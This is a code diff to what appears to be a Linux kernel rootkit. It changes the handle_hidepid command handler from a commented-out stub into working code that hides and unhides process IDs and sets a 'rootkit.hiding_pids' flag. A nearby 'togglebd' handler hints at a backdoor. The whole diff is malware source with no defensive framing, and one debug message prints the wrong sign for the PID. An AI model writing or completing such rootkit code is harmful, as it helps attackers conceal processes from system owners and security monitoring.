@@ -134,27 +134,23 @@ handle_togglebd(unsigned long arg)
 int
 handle_hidepid(unsigned long arg)
 {
-    char *msg = "ok??";
     long sarg = (long)arg;
 
-    /* if (!sarg) { */
-    /*     /1* unhide_pids(); *1/ */
-    /*     /1* rootkit.hiding_pids = false; *1/ */
-    /*     msg = "hidepid off"; */
-    /* } else if (sarg < 0) { */
-    /*     /1* unhide_pid((pid_t)((-1) * sarg)); *1/ */
-    /*     sprintf(msg, "unhiding pid %d", (pid_t)((-1) * sarg)); */
-    /* } else if (sarg > 0) { */
-    /*     if (!rootkit.hiding_pids) { */
-    /*         DEBUG_NOTICE("hidepid on\n"); */
-    /*         rootkit.hiding_pids = true; */
-    /*     } */
+    if (!sarg) {
+        unhide_pids();
+        rootkit.hiding_pids = 0;
+        DEBUG_NOTICE("hidepid off\n");
+    } else if (sarg < 0) {
+        unhide_pid((pid_t)(-sarg));
+        DEBUG_NOTICE("unhiding pid %ld\n", -sarg);
+    } else if (sarg > 0) {
+        hide_pid((pid_t)sarg);
+        if (!rootkit.hiding_pids)
+            DEBUG_NOTICE("hidepid on\n");
 
-    /*     /1* hide_pid((pid_t)sarg); *1/ */
-    /*     sprintf(msg, "hiding pid %d", (pid_t)sarg); */
-    /* } */
-
-    DEBUG_NOTICE("%s\n", msg);
+        rootkit.hiding_pids = 1;
+        DEBUG_NOTICE("hiding pid %ld\n", -sarg);
+    }
 
     return 0;
 }
